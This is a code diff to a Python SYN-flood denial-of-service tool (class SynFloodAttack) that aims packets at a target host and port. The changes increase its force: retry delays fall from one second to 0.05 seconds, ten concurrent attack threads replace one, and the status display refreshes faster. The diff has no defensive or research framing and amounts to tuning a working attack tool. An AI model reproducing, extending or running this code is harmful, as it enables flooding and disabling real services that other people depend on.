@@ -47,10 +47,9 @@ class SynFloodAttack:
                 
                 # Update statistics
                 self.stats['syn_packets_sent'] += 1
-                
             except Exception as e:
                 self.stats['errors'] += 1
-                time.sleep(1)  # Small delay to avoid overwhelming the system
+                time.sleep(0.05)  # Small delay to avoid overwhelming the system
 
     def start(self):
         """Starts the attack."""
@@ -67,8 +66,10 @@ class SynFloodAttack:
         print(f"   • Target Port: {self.target_port}")
         print(f"   • Duration: {self.attack_duration}s\n")
         
-        # Start attack thread
-        threading.Thread(target=self.syn_flood, daemon=True).start()
+        # Start multiple attack threads (for concurrency)
+        num_threads = 10  # You can adjust this to the desired number of threads
+        for _ in range(num_threads):
+            threading.Thread(target=self.syn_flood, daemon=True).start()
 
         # Attack duration loop
         try:
@@ -80,7 +81,7 @@ class SynFloodAttack:
                     f"Errors: {self.stats['errors']}",
                     end='', flush=True
                 )
-                time.sleep(0.5)
+                time.sleep(0.05)
         except KeyboardInterrupt:
             print("\n🛑 Stopped by user!")
 
